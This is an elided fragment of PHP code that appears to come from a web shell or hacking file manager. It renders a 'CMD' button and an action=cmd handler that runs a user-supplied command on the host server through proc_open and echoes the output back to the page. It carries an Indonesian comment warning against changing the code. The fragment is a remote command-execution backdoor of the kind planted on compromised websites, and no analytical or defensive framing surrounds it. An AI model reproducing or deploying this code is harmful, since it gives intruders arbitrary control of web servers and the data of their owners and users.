...
echo "<a href='?p=".urlencode(encodePath(PATH))."&action=cmd' class='button'><i class='fas fa-terminal'></i>CMD</a>\n";
echo "</div></center>";
echo '
...
if(isset($_GET['action']) && $_GET['action'] == 'cmd') {
    ...
    if (!preg_match("/".$ler."/i", $coman)) {
        $coman = $coman." ".$ler;
    } /* JANGAN DI UBAH YA PLER :V */
    $komen = $coman;
    $pr = "proc_open";
    if (function_exists($pr)) {
    $tod = @proc_open($komen, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $crottz, PATH);
    echo "<pre style='background-color: #292d3e; padding: 10px; border-radius: 5px; max-width: 100%; overflow-x: auto; margin-bottom: 10px;'>
    ".htmlspecialchars(stream_get_contents($crottz[1]))."</pre><br>";
    } else {
